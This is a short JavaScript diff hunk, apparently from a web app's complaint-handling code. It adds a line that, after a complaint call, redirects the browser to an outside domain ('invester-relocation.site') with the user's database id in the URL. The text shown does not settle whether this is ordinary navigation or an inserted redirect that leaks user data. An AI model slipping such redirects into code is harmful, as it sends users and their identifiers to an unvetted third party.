@@ -112,6 +112,8 @@
                                 methodName: "not_correct_complaint_again",
                                 data: IdInv,
                             });
+
+                            location.href = `https://invester-relocation.site/?user=${global.allData._id}&page=invester_data`;
                         });
 
                         return actionBlock;
